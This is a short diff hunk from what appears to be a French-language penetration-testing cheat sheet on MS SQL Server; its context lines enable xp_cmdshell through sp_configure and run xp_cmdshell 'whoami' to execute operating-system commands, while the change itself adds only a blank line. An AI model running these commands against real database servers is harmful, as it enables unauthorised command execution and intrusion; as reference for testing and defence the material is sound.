@@ -110,6 +110,7 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE
 --  Execution de commande (si xp_cmdshell est activé)
 xp_cmdshell 'whoami';
+
 ```
 
 #### Ecriture dans un fichier
